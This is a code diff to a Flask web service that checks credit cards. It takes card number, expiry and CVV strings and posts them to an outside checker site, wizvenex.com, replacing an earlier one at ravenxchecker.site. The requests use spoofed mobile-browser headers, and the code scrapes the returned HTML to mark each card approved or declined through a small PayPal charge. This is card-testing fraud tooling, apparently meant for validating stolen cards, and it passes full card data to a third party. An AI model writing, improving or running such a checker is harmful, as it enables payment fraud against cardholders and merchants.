@@ -1,10 +1,45 @@
 from flask import Flask, request, jsonify
 import requests
+import re
 
 app = Flask(__name__)
 
+def process_paypal_response(raw_text):
+    """Extract status and response message from raw HTML"""
+    # Check for server error responses (502 or 503)
+    if '502' in raw_text or '503' in raw_text:
+        return {
+            "response": "CARD DECLINED",
+            "status": "DECLINED"
+        }
+
+    # Check for approved status or specific conditions
+    if 'text-success">APPROVED<' in raw_text or 'EXISTING_ACCOUNT_RESTRICTED' in raw_text:
+        status = "APPROVED"
+        parts = raw_text.split('class="text-success">')
+        if len(parts) > 2:
+            response_msg = parts[2].split('</span>')[0].strip()
+        else:
+            response_msg = "PAYPAL_APPROVED" if 'APPROVED' in raw_text else "EXISTING_ACCOUNT_RESTRICTED"
+    elif 'CARD ADDED' in raw_text:
+        status = "APPROVED"
+        response_msg = "CARD ADDED"
+    else:
+        # Check for declined status
+        status = "DECLINED"
+        parts = raw_text.split('class="text-danger">')
+        if len(parts) > 2:
+            response_msg = parts[2].split('</span>')[0].strip()
+        else:
+            response_msg = "CARD DECLINED"
+
+    return {
+        "response": response_msg,
+        "status": status
+    }
+
 def check_paypal_card(cc_details):
-    """Check PayPal status using the new API endpoint"""
+    """Check PayPal status for a single card"""
     if not len(cc_details.split('|')) == 4:
         return {
             "response": "Invalid format. Use CC|MM|YYYY|CVV",
@@ -12,93 +47,45 @@ def check_paypal_card(cc_details):
             "gateway": "Paypal [0.1$]"
         }
 
-    url = f"http://ravenxchecker.site/check/ppa.php?lista={cc_details}"
+    headers = {
+        'authority': 'wizvenex.com',
+        'accept': '*/*',
+        'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
+        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        'origin': 'https://wizvenex.com',
+        'referer': 'https://wizvenex.com/',
+        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
+        'sec-ch-ua-mobile': '?1',
+        'sec-ch-ua-platform': '"Android"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-origin',
+        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
+        'x-requested-with': 'XMLHttpRequest',
+    }
+
+    data = {'lista': cc_details}
 
     try:
-        response = requests.get(url, timeout=30)
-        response.raise_for_status()  # Raise exception for HTTP errors
-        
-        # Parse the JSON response
-        data = response.json()
-        
-        # Determine status based on API's "status" field
-        if data['status'] == "LIVE":
-            # For LIVE status, determine response based on response_code
-            if data['response_code'] == "SUCCESS":
-                return {
-                    "gateway": "Paypal [0.1$]",
-                    "response": "CARD ADDED",
-                    "status": "approved"
-                }
-            elif data['response_code'] == "ACCOUNT_RESTRICTED":
-                return {
-                    "gateway": "Paypal [0.1$]",
-                    "response": "EXISTING_ACCOUNT_RESTRICTED",
-                    "status": "approved"
-                }
-            elif data['response_code'] == "3DS_REQUIRED":
-                return {
-                    "gateway": "Paypal [0.1$]",
-                    "response": "3DS VERIFICATION REQUIRED",
-                    "status": "approved"
-                }
-            elif data['response_code'] == "CARD_GENERIC_ERROR":
-                return {
-                    "gateway": "Paypal [0.1$]",
-                    "response": "ISSUER_DECLINE",
-                    "status": "declined"
-                }
-            else:
-                return {
-                    "gateway": "Paypal [0.1$]",
-                    "response": data['response_code'],
-                    "status": "approved"
-                }
-                
-        elif data['status'] == "DEAD":
-            # For DEAD status, check for special response codes
-            if data['response_code'] == "3DS_REQUIRED":
-                return {
-                    "gateway": "Paypal [0.1$]",
-                    "response": "CARD DECLINED",
-                    "status": "declined"
-                }
-            elif data['response_code'] == "CARD_GENERIC_ERROR":
-                return {
-                    "gateway": "Paypal [0.1$]",
-                    "response": "CARD DECLINED",
-                    "status": "declined"
-                }
-            elif data['response_code'] == "UNKNOWN_ERROR":
-                return {
-                    "gateway": "Paypal [0.1$]",
-                    "response": "CARD DECLINED",
-                    "status": "declined"
-                }                
-            else:
-                return {
-                    "gateway": "Paypal [0.1$]",
-                    "response": data['response_code'],
-                    "status": "declined"
-                }
-                
-        else:
-            # Handle unexpected status values
-            return {
-                "gateway": "Paypal [0.1$]",
-                "response": f"UNKNOWN_STATUS: {data['status']}",
-                "status": "error"
-            }
-            
-    except requests.exceptions.RequestException as e:
+        response = requests.post(
+            'https://wizvenex.com/Paypal.php',
+            headers=headers,
+            data=data,
+            timeout=30
+        )
+        result = process_paypal_response(response.text)
+        result["gateway"] = "Paypal [0.1$]"
+        return result
+
+    except requests.exceptions.Timeout:
         return {
-            "response": f"API_REQUEST_ERROR: {str(e)}",
+            "response": "TIMEOUT_ERROR",
             "status": "ERROR",
             "gateway": "Paypal [0.1$]"
         }
-    except ValueError:  # Invalid JSON
+    except Exception as e:
         return {
-            "response": "INVALID_API_RESPONSE",
+            "response": f"REQUEST_FAILED: {str(e)}",
             "status": "ERROR",
             "gateway": "Paypal [0.1$]"
         }
